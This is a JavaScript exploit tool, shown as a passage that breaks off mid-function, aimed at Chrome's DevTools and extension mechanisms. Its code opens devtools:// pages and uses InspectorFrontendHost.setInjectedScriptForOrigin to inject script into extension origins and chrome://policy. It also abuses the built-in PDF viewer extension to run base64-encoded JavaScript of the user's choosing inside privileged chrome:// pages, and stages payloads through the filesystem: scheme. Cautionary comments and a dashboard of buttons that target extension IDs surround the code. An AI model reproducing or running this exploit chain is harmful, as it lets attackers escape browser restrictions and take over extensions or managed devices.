/**
 * @fileoverview Script to interact with Chrome DevTools, extensions, and potentially exploit/debug them.
 * Warning: This script appears to perform actions that could be risky or relate to browser security mechanisms.
 * Use with extreme caution and understanding.
 */
(function () {
    'use strict';

    // --- Constants ---
    const DEVTOOLS_URL = "devtools://devtools/bundled/devtools_app.html";
    const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
    const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
    const IFRAME_TRACKER_EVENT_REMOVE = 'removeIframe';
    const IFRAME_TRACKER_EVENT_UID_PASS = 'uidPass';
    const IFRAME_PARENT_MESSAGE_TYPE_ACC = 'acc';
    const IFRAME_PARENT_MESSAGE_TYPE_ACK = 'ack';
    const BROWSER_INIT_NAVIGATE_EVENT = 'browserInitNavigate';
    const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%"; // Placeholder for actual updater URL

    // Placeholders - These would be replaced by a build process
    const PLACEHOLDER_HTML_ENTRY = "%%HTMLENTRY%%";
    const PLACEHOLDER_EXT_JS = "%%EXTJS%%";
    const PLACEHOLDER_EXT_HTML = "%%EXTHTML%%";
    const PLACEHOLDER_CHROME_PAYLOAD = "%%CHROMEPAYLOAD%%"; // Placeholder for payload executed via chrome.tabs.executeScript

    // --- Utility Functions ---

    /**
     * Pauses execution for a specified duration.
     * @param {number} ms - Milliseconds to sleep.
     * @returns {Promise<void>}
     */
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Safely gets the window.opener, defaulting to the current window if none exists.
     * Note: Defaulting to self might not be intended opener behavior in all contexts.
     * @returns {Window} The opener or the current window.
     */
    function getOpener() {
        try {
            // Accessing opener can throw cross-origin errors in some contexts if not set correctly.
            return window.opener || window;
        } catch (e) {
            console.warn("Could not access window.opener, defaulting to current window.", e);
            return window;
        }
    }

    /**
     * Writes data to a file in the temporary filesystem.
     * @param {FileSystem} fs - The filesystem object.
     * @param {string} filename - The name of the file to write.
     * @param {string | Blob} data - The data to write.
     * @returns {Promise<string>} A promise resolving with the file's URL (filesystem:...).
     */
    function writeFile(fs, filename, data) {
        return new Promise((resolve, reject) => {
            fs.root.getFile(filename, { create: true }, (fileEntry) => {
                fileEntry.createWriter((fileWriter) => {
                    fileWriter.onwriteend = () => resolve(fileEntry.toURL());
                    fileWriter.onerror = (e) => reject(new Error(`Failed to write file ${filename}: ${e.toString()}`));
                    const blobData = data instanceof Blob ? data : new Blob([data]);
                    fileWriter.write(blobData);
                }, (e) => reject(new Error(`Failed to create writer for ${filename}: ${e.toString()}`)));
            }, (e) => reject(new Error(`Failed to get file entry for ${filename}: ${e.toString()}`)));
        });
    }

    /**
     * Removes a file from the temporary filesystem.
     * @param {FileSystem} fs - The filesystem object.
     * @param {string} filename - The name of the file to remove.
     * @returns {Promise<void>} A promise resolving when the file is removed.
     */
    function removeFile(fs, filename) {
        return new Promise((resolve, reject) => {
            fs.root.getFile(filename, { create: false }, // Don't create if it doesn't exist
                (fileEntry) => {
                    fileEntry.remove(resolve, (e) => reject(new Error(`Failed to remove file ${filename}: ${e.toString()}`)));
                },
                (e) => {
                    // If file not found, resolve successfully as it's already "removed"
                    if (e.name === 'NotFoundError') {
                        resolve();
                    } else {
                        reject(new Error(`Failed to get file entry for removal ${filename}: ${e.toString()}`));
                    }
                }
            );
        });
    }

    /**
     * Requests and uses the temporary filesystem.
     * Warning: webkitRequestFileSystem is deprecated and non-standard.
     * @param {function(FileSystem): Promise<any>} callback - Async function to execute with the filesystem.
     * @returns {Promise<any>} Result of the callback.
     */
    async function withTempFileSystem(callback) {
        return new Promise((resolve, reject) => {
            if (!window.webkitRequestFileSystem) {
                return reject(new Error("webkitRequestFileSystem API is not available."));
            }
            window.webkitRequestFileSystem(TEMPORARY, 5 * 1024 * 1024, // 5MB quota
                async (fs) => {
                    try {
                        resolve(await callback(fs));
                    } catch (error) {
                        reject(error);
                    }
                }, (e) => reject(new Error(`Failed to request filesystem: ${e.toString()}`))
            );
        });
    }


    // --- Core Logic: DevTools Interaction ---

    /**
     * Opens the DevTools window and waits for the DevToolsAPI to be available.
     * Handles potential reloads if the API isn't immediately present.
     * @param {Window} openerWindow - The window object used to open DevTools.
     * @returns {Promise<Window>} The DevTools window object with DevToolsAPI available.
     * @throws {Error} If DevTools cannot be opened or the API doesn't load.
     */
    async function openDevToolsAndGetAPI(openerWindow) {
        console.log("Attempting to open DevTools...");
        const devtoolsWindow = openerWindow.open(DEVTOOLS_URL);
        if (!devtoolsWindow) {
            throw new Error("Failed to open DevTools window. Popup blocker maybe?");
        }

        // Close the original opener window immediately after launching devtools
        // Be careful: This assumes the script's purpose is fulfilled by the new devtoolsWindow
        try {
            if (openerWindow !== window) { // Avoid closing self if opener defaulted to window
               openerWindow.close();
            }
        } catch (e) {
            console.warn("Could not close opener window:", e);
        }


        return new Promise((resolve, reject) => {
            let attempt = 0;
            const maxAttempts = 3; // Limit reload attempts

            const checkApi = async () => {
                console.log("Checking for DevToolsAPI...");
                if (devtoolsWindow.DevToolsAPI) {
                    console.log("Got DevToolsAPI object from opened window:", devtoolsWindow.DevToolsAPI);
                    resolve(devtoolsWindow);
                } else if (attempt < maxAttempts) {
                    attempt++;
                    console.warn(`DevToolsAPI not found (Attempt ${attempt}/${maxAttempts}). Reloading DevTools window...`);
                    // Setting opener to null might be an attempt to break connection before reload?
                    try {
                        devtoolsWindow.opener = null;
                        devtoolsWindow.location.reload();
                        devtoolsWindow.addEventListener("load", checkApi, { once: true });
                        // Add a timeout safeguard in case 'load' doesn't fire after reload
                        setTimeout(() => {
                             if(!devtoolsWindow.DevToolsAPI && !devtoolsWindow.closed) {
                                console.error(`DevToolsAPI still not found after reload attempt ${attempt} and timeout.`);
                                // Optional: reject here or let it try again on next 'load' if applicable
                             }
                        }, 5000); // 5 second timeout for reload + load event

                    } catch (e) {
                        reject(new Error(`Failed during DevTools reload attempt ${attempt}: ${e}`));
                    }
                } else {
                    try { devtoolsWindow.close(); } catch (e) {}
                    reject(new Error(`Failed to get DevToolsAPI after ${maxAttempts} attempts.`));
                }
            };

            // Use DOMContentLoaded as it often fires earlier than 'load'
            devtoolsWindow.addEventListener("DOMContentLoaded", checkApi, { once: true });
            // Add a timeout for the initial load check
             setTimeout(() => {
                if(!devtoolsWindow.DevToolsAPI && !devtoolsWindow.closed) {
                    console.warn("DevToolsAPI not found after initial load timeout. Will rely on DOMContentLoaded/load event.");
                    // It might already be loading, so don't immediately fail here unless DOMContentLoaded also timed out
                }
             }, 3000); // 3 second initial timeout
        });
    }


    // --- Core Logic: Exploit/Debug UI ---

    /**
     * This function is intended to be stringified and executed in the DevTools context.
     * It sets up a UI and logic for interacting with/debugging extensions.
     * Note: Depends on placeholders (%%HTMLENTRY%%, etc.) being replaced.
     */
    function devToolsUI() {
        // --- UI Scope Constants ---
        const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Keep definition here as it's used within stringified functions below
        const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";

        // Placeholders expected by this function's stringified version
        const PLACEHOLDER_HTML_ENTRY = "%%HTMLENTRY%%";
        const PLACEHOLDER_EXT_JS = "%%EXTJS%%";
        const PLACEHOLDER_EXT_HTML = "%%EXTHTML%%";
        const PLACEHOLDER_CHROME_PAYLOAD = "%%CHROMEPAYLOAD%%"; // Placeholder for payload executed via chrome.tabs.executeScript
        const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%";

        // --- UI State ---
        const iframeManager = {
            iframes: {}, // Store iframes by ID
            nextId: 0,
            add: function(iframeElement) {
                const id = this.nextId++;
                iframeElement.dataset.managedId = id; // Store ID on the element
                this.iframes[id] = iframeElement;
                return id;
            },
            remove: function(id) {
                const iframe = this.iframes[id];
                if (iframe) {
                    iframe.remove(); // Remove from DOM
                    delete this.iframes[id];
                    console.log(`Removed tracked iframe with ID: ${id}`);
                } else {
                    console.warn(`Attempted to remove non-existent iframe with ID: ${id}`);
                }
            },
            get: function(id) {
                return this.iframes[id];
            }
        };

        // --- Filesystem Payloads ---

        /**
         * Payload executed within an extension's context via filesystem/iframe trick.
         * Handles communication back to the parent (DevTools UI) and potentially executes further actions.
         * Intended to be stringified.
         */
        function payload_swamp(targetWindow, dataFromParent) {
            const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition necessary for stringification
            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js"; // Redefinition necessary for stringification

            // Utility to signal parent to remove the iframe
            function cleanup() {
                if (window.parent && dataFromParent && typeof dataFromParent.uid !== 'undefined') {
                     window.parent.postMessage({ type: 'removeIframe', uid: dataFromParent.uid }, '*');
                } else {
                    console.warn("Cleanup could not message parent (missing data or parent).");
                }
                 // Also attempt self-close, though parent removal is cleaner
                try { window.close(); } catch(e) {}
            }

            // Specific logic for PDF extension
            if (location.origin === "chrome-extension://" + PDF_EXTENSION_ID) {
                console.log("Running payload inside PDF Viewer context.");
                targetWindow.close(); // Close the opened `index.html` tab from DevTools context
                 if (typeof chrome !== 'undefined' && chrome.tabs && chrome.windows) {
                     chrome.tabs.getCurrent((currentTabInfo) => {
                        if (chrome.runtime.lastError) {
                           console.error("Error getting current tab:", chrome.runtime.lastError.message);
                           cleanup(); // Can't proceed, attempt cleanup
                           return;
                        }
                         chrome.windows.create({
                            setSelfAsOpener: true, // Important for potential subsequent interactions
                            url: MOJO_BINDINGS_URL
                        }, (newWindowInfo) => {
                            if (chrome.runtime.lastError) {
                                console.error("Error creating window:", chrome.runtime.lastError.message);
                                cleanup();
                                return;
                            }
                             if (newWindowInfo && newWindowInfo.tabs && newWindowInfo.tabs.length > 0) {
                                const mojoTabId = newWindowInfo.tabs[0].id;
                                const codeToExecute = `location.href = "javascript:${atob('%%CHROMEPAYLOAD%%')}"`; // Placeholder replacement needed
                                console.log("Executing script in new Mojo tab:", codeToExecute);
                                chrome.tabs.executeScript(mojoTabId, { code: codeToExecute }, () => {
                                    if (chrome.runtime.lastError) {
                                        console.error("Error executing script in Mojo tab:", chrome.runtime.lastError.message);
                                    } else {
                                        console.log("Script execution initiated in Mojo tab.");
                                    }
                                    // Whether script execution succeeded or failed, clean up the iframe
                                    cleanup();
                                });
                             } else {
                                console.error("Failed to get tab info from newly created window.");
                                cleanup();
                            }
                        });
                     });
                 } else {
                     console.error("Chrome APIs (tabs, windows) not available in this context.");
                     cleanup();
                 }
                 return; // End execution for PDF context
            }

            // Generic filesystem payload logic
            console.log("Running generic filesystem payload. Data from parent:", dataFromParent);

            if (!window.webkitRequestFileSystem) {
                 alert("Filesystem API not available in this context. Cannot proceed.");
                 console.error("webkitRequestFileSystem not available.");
                 cleanup();
                 return;
            }

            window.webkitRequestFileSystem(TEMPORARY, 5 * 1024 * 1024, async (fs) => {
                console.log("Obtained temporary filesystem access.");

                 // --- Nested Filesystem Helpers ---
                 function writeFileFS(filename, fileData) {
                     return new Promise((resolve, reject) => {
                         fs.root.getFile(filename, { create: true }, (entry) => {
                             entry.createWriter((writer) => {
                                 writer.onwriteend = () => resolve(entry.toURL());
                                 writer.onerror = (e) => reject(new Error(`FS Write Error: ${e.toString()}`));
                                 writer.write(new Blob([fileData]));
                             }, (e) => reject(new Error(`FS Create Writer Error: ${e.toString()}`)));
                         }, (e) => reject(new Error(`FS Get File Error: ${e.toString()}`)));
                     });
                 }
                 function removeFileFS(filename) {
                    return new Promise((resolve, reject) => {
                        fs.root.getFile(filename, { create: false },
                            (entry) => entry.remove(resolve, (e) => reject(new Error(`FS Remove Error: ${e.toString()}`))),
                            (e) => (e.name === 'NotFoundError' ? resolve() : reject(new Error(`FS Get File for Remove Error: ${e.toString()}`))) // Resolve if not found
                        );
                    });
                 }
                 // --- End Nested Helpers ---

                try {
                    if (dataFromParent && dataFromParent.cleanup) {
                        console.log("Cleaning up filesystem files...");
                        await removeFileFS('index.js');
                        await removeFileFS('index.html');
                        console.log("Filesystem cleanup complete.");
                        alert("Cleaned up successfully!");
                    } else {
                        console.log("Writing extension files to filesystem...");
                        await writeFileFS('index.js', atob(`%%EXTJS%%`)); // Placeholder replacement needed
                        const htmlContent = `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`; // Placeholder replacement needed
                        const fsUrl = await writeFileFS('index.html', htmlContent);
                        console.log(`Extension HTML written to filesystem URL: ${fsUrl}`);

                        // Attempt to open the filesystem URL in a new tab
                        if (targetWindow.chrome && targetWindow.chrome.tabs) {
                           targetWindow.chrome.tabs.create({ url: fsUrl });
                           console.log("Opened filesystem URL in new tab via chrome.tabs.create.");
                        } else {
                            console.warn("chrome.tabs API not available in target window, attempting simple open().");
                            targetWindow.open(fsUrl); // Fallback, might be blocked
                        }
                    }
                } catch (error) {
                     console.error("Error during filesystem operation:", error);
                     alert(`Filesystem operation failed: ${error.message}`);
                } finally {
                     // Always close the intermediate window/tab from DevTools context and signal cleanup
                     targetWindow.close();
                     cleanup();
                }

            }, (e) => {
                 alert(`Failed to access filesystem: ${e.toString()}`);
                 console.error("Filesystem request failed:", e);
                 cleanup();
            });
        } // end payload_swamp

        /**
         * Payload for the 'Activate Special (XD)' button. Interacts with Mojo bindings page.
         * Intended to be stringified.
         */
        function xdPayload(targetWindow) {
            // Close the intermediate window/tab
             targetWindow.close();

            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js"; // Redefinition necessary

            if (!chrome || !chrome.tabs || !chrome.windows) {
                 alert("Required Chrome APIs are not available.");
                 return;
            }

            // --- Stringified Helper Functions within xdPayload ---
            // This function runs in the context of the new Mojo bindings window
            function createAndWriteFileInMojoContext() {
                // Filesystem logic, needs to be self-contained or use passed data
                 function writeFile(filename, content) {
                     return new Promise((resolve, reject) => {
                         if (!window.webkitRequestFileSystem) return reject("Filesystem API missing");
                         webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, (fs) => {
                             fs.root.getFile(filename, { create: true }, (entry) => {
                                 entry.createWriter((writer) => {
                                     writer.onwriteend = () => resolve(entry.toURL());
                                     writer.onerror = reject;
                                     writer.write(new Blob([content]));
                                 }, reject);
                             }, reject);
                         }, reject);
                     });
                 }

                 // The HTML to write, including the iframe pointing nowhere initially
                 // and the top-level check/redirect script.
                const htmlFileContent = `<html><head></head><body>
                    <p>Loading frame...</p>
                    <iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                    <script>
                    console.log("Inner script running");
                    // Basic error logging
                    window.onerror = function(message, source, lineno, colno, error) {
                       console.error("Error in inner page:", message, "at", source, lineno, colno, error);
                       // alert("Error: " + message); // Avoid alert here unless debugging
                    };
                    // Attempt to break out of any frame if this somehow gets framed itself
                    if (top !== window) {
                       console.warn("Trying to break out of frame...");
                       try {
                           top.location.replace(location.href);
                       } catch (e) {
                           console.error("Failed to break out of frame:", e);
                       }
                    };
                    console.log("Inner script finished.");
                    </script>
                    </body></html>`;

                 // Execute the write and post message back
                 (async () => {
                     try {
                         console.log("Attempting to write file to filesystem from Mojo context...");
                         const url = await writeFile('index.html', htmlFileContent);
                         console.log("File written, URL:", url);
                         if (opener && typeof opener.postMessage === 'function') {
                            console.log("Posting URL back to opener");
                             opener.postMessage({ url: url }, '*'); // Post URL back to the DevTools UI window
                         } else {
                             console.error("Cannot post message back to opener.");
                         }
                         // Close this Mojo tab after a delay
                         setTimeout(() => { try { window.close(); } catch(e){} }, 800);
                     } catch (error) {
                         console.error('Error writing file or posting message:', error);
                         alert('Error in Mojo Context: ' + error);
                          // Attempt to close even on error
                         setTimeout(() => { try { window.close(); } catch(e){} }, 800);
                     }
                 })();
            } // end createAndWriteFileInMojoContext

            // --- Main logic for xdPayload ---
            chrome.tabs.getCurrent((tab) => {
                 if (chrome.runtime.lastError || !tab) {
                     alert(`Error getting current tab: ${chrome.runtime.lastError?.message || 'Unknown error'}`);
                     return;
                 }
                console.log("Creating new window for Mojo bindings...");
                 chrome.windows.create({ url: MOJO_BINDINGS_URL, setSelfAsOpener: true }, (winInfo) => {
                      if (chrome.runtime.lastError || !winInfo || !winInfo.tabs || !winInfo.tabs.length) {
                         alert(`Error creating Mojo window: ${chrome.runtime.lastError?.message || 'Unknown error'}`);
                         return;
                     }
                     const mojoTabId = winInfo.tabs[0].id;
                     console.log(`Mojo window created, tab ID: ${mojoTabId}. Executing script...`);

                     // Execute the filesystem writer in the new Mojo tab
                     chrome.tabs.executeScript(mojoTabId, {
                         code: `(${createAndWriteFileInMojoContext.toString()})()`
                     }, () => {
                         if (chrome.runtime.lastError) {
                            alert(`Error executing script in Mojo tab: ${chrome.runtime.lastError.message}`);
                            console.error("Mojo executeScript failed:", chrome.runtime.lastError.message);
                         } else {
                            console.log("Script execution requested in Mojo tab.");
                         }
                     });

                     // --- Message Handling (in DevTools UI context) for XD payload ---
                     // This `onmessage` handles the URL sent back from the Mojo context
                     // And then proceeds to handle the 'acc'/'ack' handshake.
                     const messageHandler = (event) => {
                         if (event.source !== winInfo.window) { // Ensure message is from the new window (might be too strict if window ref changes)
                            // Check origin instead? Or use a nonce? For now, simple check.
                           // console.log("Ignoring message from unexpected source:", event.source);
                           // return;
                         }

                         // Handle URL sent from Mojo context's filesystem writer
                         if (event.data && event.data.url) {
                             console.log("Received filesystem URL from Mojo context:", event.data.url);
                             // Setup the next stage: waiting for 'acc' from the target page (loaded via filesystem URL)
                             const fileSystemUrl = event.data.url;

                            // Nested message handler for the 'acc'/'ack' phase
                             const accAckHandler = (accEvent) => {
                                 if (accEvent.data && accEvent.data.type === 'acc') {
                                     console.log("Received 'acc' message. Sending 'ack'.");
                                     // Prevent unload during navigation? Original code had while(true). Risky. Let's just log.
                                     console.warn("Original code had 'onunload = while(true)' here. Removing harmful pattern.");
                                     // onunload = () => { console.log("Unload blocked temporarily."); return "unload blocked"; }; // Less harmful alternative? Still risky.

                                     // Send 'ack' back to the source (the filesystem page)
                                     if (accEvent.source && typeof accEvent.source.postMessage === 'function') {
                                         accEvent.source.postMessage({ type: 'ack' }, '*'); // '*' is potentially insecure, use specific origin if possible
                                         console.log("Sent 'ack'.");

                                          // PROBLEM: Original code navigates `top.location.replace("")` here.
                                          // Where should it navigate? To the filesystem URL?
                                          // This seems like a crucial missing piece or misunderstanding of the flow.
                                          // For now, let's log the intended navigation and the URL we have.
                                          console.warn("Original logic intended navigation here: top.location.replace('') - Target URL is unclear. Possibility:", fileSystemUrl);
                                           // Example: Try navigating the original (likely DevTools) window to the fs url? Seems odd.
                                           // window.location.href = fileSystemUrl;
                                           // Or navigating the source of 'acc' (the filesystem page iframe)? That seems more likely.
                                           // accEvent.source.location.href = fileSystemUrl; // Risky if source is cross-origin

                                     } else {
                                        console.error("Cannot send 'ack', source invalid.");
                                     }

                                     // Clean up this listener
                                     window.removeEventListener('message', accAckHandler);
                                     // Restore normal unload behavior
                                    // onunload = null;
                                 }
                             }; // end accAckHandler

                             window.addEventListener('message', accAckHandler);
                             console.log("Set up listener for 'acc' message.");

                             // Cleanup the outer message listener (for the URL)
                             window.removeEventListener('message', messageHandler);

                         } else if (event.data && event.data.type === 'acc') {
                             // If 'acc' arrives *before* the URL somehow, handle it via the dedicated handler
                             // This requires accAckHandler to be defined above. Let's ensure that happens.
                              console.warn("Received 'acc' message potentially out of order.");
                              // This path indicates the accAckHandler might need to be set up earlier
                              // or handle this case directly if the URL is not needed for the 'ack' response/navigation.
                              // Let's call a hypothetical preconfigured handler if it exists
                              // handleAccMessage(event); // Assuming handleAccMessage is defined and deals with this.

                         } else {
                            // Log unexpected messages
                            // console.log("Received other message:", event.data);
                         }
                     }; // end messageHandler (handling URL and setting up 'acc' listener)

                     window.addEventListener('message', messageHandler);
                     console.log("Set up listener for URL message from Mojo context.");
                 });
             }); // end getCurrent tab

        } // end xdPayload

        // --- Main UI Setup ---

        function setupUI() {
            console.log("Setting up DevTools UI...");
            document.open();
            document.write(atob(PLACEHOLDER_HTML_ENTRY || "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5EYXNoYm9hcmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+RGV2VG9vbHMgSW50ZXJmYWNlPC9oMT4KPHA+QWN0aW9uczo8L3A+Cjx1bD4KCTxsaT48YnV0dG9uIGlkPSJhY3RpdmF0ZSI+QWN0aXZhdGUgKERlZmF1bHQgUERGKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iYWN0aXZhdGUyIj5BY3RpdmF0ZSBTcGVjaWFsIChYRCBQREYpPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJleHRkYmciPkRlYnVnIE90aGVyIEV4dGVuc2lvbjwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iY2xlYW51cCI+Q2xlYW51cCBGaWxlc3lzdGVtPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJkZXZkYmciPkRlYnVnIERldlRvb2xzIChFdmFsKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0idXBkYXRlciI+Q2hlY2sgZm9yIFVwZGF0ZXI8L2J1dHRvbj48L2xpPgo8L3VsPgo8cD5IYXJkY29kZWQgRXh0ZW5zaW9uczo8L3A+CjwhLS0gQWRkIG1vcmUgaGFyZGNvZGVkIGJ1dHRvbnMgYXMgbmVlZGVkIC0tPgo8dWwgY2xhc3M9ImhhcmRjb2RlZC1saXN0Ij4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0iZWplbWRkaWhlbmtvZGZoZWxtZmJhaGdjaWdrYWZpZGMiPkV4YW1wbGUgRXh0IDGPC9idXR0b24+PC9saT4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0ibmhwaXBkZ2VhbGdkbWxkZGVtYWZubGlsa2lvZ25kYSI+RXhhbXBsZSBFeHQgMjwvYnV0dG9uPjwvbGk+CjwvdWw+CjxoMj5Mb2dnZWQgSWZyYW1lczo8L2gyPgo8cHJlIGlkPSJsb2ciPjwvcHJlPgo8L2JvZHk+CjwvaHRtbD4=")); // Provide a basic fallback HTML structure
            document.close();
            document.title = "Extension Debug Dashboard";

            if (!window.InspectorFrontendHost) {
                alert("InspectorFrontendHost is not available. Extension debugging features will not work.");
                console.error("InspectorFrontendHost not found!");
                // Disable buttons that rely on it?
            }

            attachEventListeners();
            console.log("DevTools UI setup complete.");
        }

        /** Attaches event listeners to the UI elements */
        function attachEventListeners() {
            document.querySelector('#activate')?.addEventListener('click', () => {
                console.log("Activate (Default PDF) clicked.");
                debugExtensionInteraction(false, PDF_EXTENSION_ID); // Default payload_swamp
            });

            document.querySelector('#activate2')?.addEventListener('click', () => {
                console.log("Activate Special (XD PDF) clicked.");
                 // Pass the xdPayload function string for injection
                debugExtensionInteraction(false, PDF_EXTENSION_ID, xdPayload.toString());
            });

             document.querySelector('#extdbg')?.addEventListener('click', () => {
                console.log("Debug Other Extension clicked.");
                 debugExtensionInteraction(false); // Will prompt for ID, use default payload_swamp
             });

            document.querySelectorAll('.hardcoded').forEach(el => {
                el.addEventListener('click', () => {
                    const extId = el.getAttribute("ext");
                    console.log(`Hardcoded extension "${el.innerText}" clicked. ID: ${extId}`);
                    if (extId) {
                        debugExtensionInteraction(false, extId); // Default payload_swamp
                    } else {
                        console.warn("Hardcoded button clicked but missing 'ext' attribute.");
                    }
                });
            });

            document.querySelector('#cleanup')?.addEventListener('click', () => {
                 console.log("Cleanup Filesystem clicked.");
                 debugExtensionInteraction(true); // Will prompt for ID, uses cleanup flag
            });

            document.querySelector('#updater')?.addEventListener('click', handleUpdaterCheck);
            document.querySelector('#devdbg')?.addEventListener('click', handleDevtoolsDebugEval);

             // Listener for messages from created iframes (e.g., cleanup requests)
            window.addEventListener('message', handleIframeMessages);
        }

        /** Handles messages originating from the spawned iframes */
        function handleIframeMessages(event) {
             // Basic security check: should ideally check origin
            // if (event.origin !== expectedOrigin) return;

            const data = event.data;
            if (data && data.type === IFRAME_TRACKER_EVENT_REMOVE && typeof data.uid !== 'undefined') {
                 console.log(`Received request to remove iframe with ID: ${data.uid}`);
                 iframeManager.remove(data.uid);
                 updateIframeLog();
            } else if (data && data.type === BROWSER_INIT_NAVIGATE_EVENT) {
                 // This message type seems intended to make the DevTools window navigate?
                 console.warn(`Received ${BROWSER_INIT_NAVIGATE_EVENT}. Attempting navigation to:`, data.url);
                 if (event.source && typeof event.source.location?.replace === 'function') {
                    // Is it intended to navigate the source frame or the main (DevTools) window?
                    // Original code implies navigating the source (ev.source.location.replace).
                    try {
                        event.source.location.replace(data.url);
                    } catch (e) {
                       console.error("Error trying to navigate source frame:", e) ;
                       // Fallback/Alternative: Navigate the DevTools window itself?
                       // window.location.href = data.url;
                    }
                 } else {
                    console.error("Cannot navigate: invalid source or replace function.");
                 }
            }
             // NOTE: The 'acc'/'ack' handshake is handled specifically within the xdPayload flow currently.
             // If it needs to be more generic, it should be integrated here.
        }

        /** Initiates interaction with a target extension */
        function debugExtensionInteraction(isCleanup = false, targetExtensionId = null, specificPayload = null) {
             const extensionId = targetExtensionId || prompt('Enter Target Extension ID:');
             if (!extensionId || extensionId === "cancel") {
                 console.log("Extension interaction cancelled.");
                 return;
             }

             let manifestPath = '/manifest.json'; // Default path
             let payloadToInject = specificPayload || payload_swamp.toString(); // Use specific payload or default swamp

            // Special handling for the PDF viewer extension
             if (extensionId === PDF_EXTENSION_ID) {
                 console.log("Targeting PDF Viewer Extension.");
                 manifestPath = 'index.html'; // Specific entry point for PDF viewer hack?

                 // If using the default payload_swamp for PDF, prompt for the inner payload
                 if (payloadToInject === payload_swamp.toString()) {
                    const jsCode = prompt("Enter JavaScript code to execute via chrome.tabs.executeScript (will be Base64 encoded):");
                     if (!jsCode || jsCode === "cancel") {
                         console.log("PDF payload entry cancelled.");
                         return;
                     }
                    payloadToInject = payloadToInject.replace('%%CHROMEPAYLOAD%%', btoa(jsCode));
                     // The original code also set an injected script for chrome://policy here.
                     // This seems highly suspicious and potentially dangerous. Replicating with caution.
                     // Requires understanding what 'jsCode + "//"' is intended to do.
                     try {
                        console.warn("Attempting to set injected script for chrome://policy origin (potential security risk).");
                        // The appended "//" might be syntax to make it a valid script/comment? Needs verification.
                        InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', jsCode + '//');
                    } catch (e) {
                       console.error("Failed to set injected script for chrome://policy:", e);
                       alert("Failed to set injected script for chrome://policy. See console.");
                       // Should we abort here? Depends on whether this is critical.
                    }
                }
            } else {
                // Ensure placeholders are handled or removed for generic extensions if they aren't replaced externally
                payloadToInject = payloadToInject.replace('%%CHROMEPAYLOAD%%', "''"); // Avoid errors if not replaced
            }

            // --- Injection Script ---
            // This script runs briefly in the extension's context when the iframe loads.
            // It sets up a message listener to receive UID and config, then opens the actual target path
            // in a new window, passing the UID/config along. It also defines window.cleanup.
             const injectionWrapper = `
                console.log("Injection wrapper running in ${location.origin}");
                // Define cleanup function early
                window.cleanup = () => {
                    if (window.sys && typeof window.sys.passcode !== 'undefined') {
                        console.log("Cleanup called, posting message to parent with UID:", window.sys.passcode);
                         window.parent.postMessage({ type: '${IFRAME_TRACKER_EVENT_REMOVE}', uid: window.sys.passcode }, '*');
                    } else {
                       console.warn("Cleanup called but missing sys info.");
                    }
                };
                 window.onmessage = (event) => {
                     // Basic origin check recommended here in production
                     console.log("Received message in injection wrapper:", event.data);
                     if (event.data && typeof event.data.passcode !== 'undefined') {
                        console.log("Received UID/config:", event.data);
                        window.sys = event.data; // Store UID and config (like cleanup flag)
                        // Prevent this listener from firing again if multiple messages arrive
                        window.onmessage = null;

                        const targetPath = '${manifestPath}'; // Path received from outer scope
                        const targetUrl = new URL(targetPath, location.origin).href;
                        console.log("Opening target URL:", targetUrl);

                        const targetWindow = window.open(targetUrl);

                        if (targetWindow) {
                             // Inject the main payload (payload_swamp or xdPayload string) into the new window
                             targetWindow.onload = () => {
                                console.log("Target window loaded:", targetUrl);
                                try {
                                    // Execute the actual payload function in the target window's context
                                     (${payloadToInject})(targetWindow, window.sys);
                                 } catch (e) {
                                     console.error("Error executing injected payload:", e);
                                     alert("Error in injected payload: " + e.message);
                                     window.cleanup(); // Attempt cleanup on error
                                     try { targetWindow.close(); } catch(err){}
                                 }
                            };
                             // Handle cases where the window fails to load (e.g., blocked popup)
                            targetWindow.onerror = (err) => {
                                console.error("Error loading target window:", targetUrl, err);
                                alert("Failed to load target window: " + targetUrl);
                                window.cleanup();
                            };
                         } else {
                            console.error("Failed to open target window:", targetUrl);
                            alert("Failed to open target window. Popup blocker?");
                            window.cleanup(); // Cleanup if window fails to open
                        }
                    }
                };
            `;
            // --- End Injection Script ---


             const extensionOrigin = `chrome-extension://${extensionId}`;
             console.log(`Injecting script wrapper for origin: ${extensionOrigin}`);
             try {
                 // Set up the script that will run inside the initial iframe
                 InspectorFrontendHost.setInjectedScriptForOrigin(extensionOrigin, injectionWrapper);

                 // Create the iframe to trigger the injection
                 const iframe = document.createElement("iframe");
                 iframe.src = `${extensionOrigin}${manifestPath}`; // Load manifest/entry point to trigger script
                 iframe.style.display = 'none'; // Keep it hidden
                 document.body.appendChild(iframe);

                 const iframeId = iframeManager.add(iframe);
                 console.log(`Created iframe with ID: ${iframeId}, loading: ${iframe.src}`);
                 updateIframeLog();

                 iframe.onload = () => {
                    console.log(`Iframe ${iframeId} loaded. Posting UID/config to it.`);
                    if (iframe.contentWindow) {
                         iframe.contentWindow.postMessage({
                            type: IFRAME_TRACKER_EVENT_UID_PASS,
                             passcode: iframeId,
